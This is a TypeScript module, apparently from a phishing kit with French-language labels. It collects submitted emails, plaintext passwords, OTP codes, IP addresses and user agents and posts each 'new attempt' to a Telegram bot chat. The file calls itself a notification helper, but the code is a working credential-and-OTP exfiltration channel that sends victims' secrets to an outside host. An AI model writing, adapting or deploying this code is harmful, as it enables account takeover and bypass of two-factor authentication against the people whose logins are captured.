import { TELEGRAM_CONFIG } from '../config/telegram';

interface TelegramMessage {
  type: 'login' | 'otp';
  data: Record<string, any>;
  timestamp: string;
}

export async function sendTelegramNotification(message: TelegramMessage) {
  const { BOT_TOKEN, CHAT_ID, API_URL } = TELEGRAM_CONFIG;
  
  const formattedMessage = formatTelegramMessage(message);

  try {
    const response = await fetch(`${API_URL}${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: formattedMessage,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to send Telegram notification');
    }
  } catch (error) {
    console.error('Telegram notification error:', error);
  }
}

function formatTelegramMessage(message: TelegramMessage): string {
  const emoji = message.type === 'login' ? '🔐' : '🔑';
  const action = message.type === 'login' ? 'Connexion' : 'Code OTP';
  
  return `
${emoji} Nouvelle tentative - ${action}
⏰ ${new Date(message.timestamp).toLocaleString('fr-FR')}

${formatMessageData(message.data)}
  `.trim();
}

function formatMessageData(data: Record<string, any>): string {
  const order = ['email', 'password', 'otp', 'ip', 'userAgent'];
  const labels = {
    email: '📧 Email',
    password: '🔒 Mot de passe',
    otp: '🔢 Code OTP',
    ip: '🌐 Adresse IP',
    userAgent: '🔍 User Agent'
  };

  return order
    .filter(key => key in data)
    .map(key => `<b>${labels[key as keyof typeof labels]}:</b>\n${data[key]}`)
    .join('\n\n');
}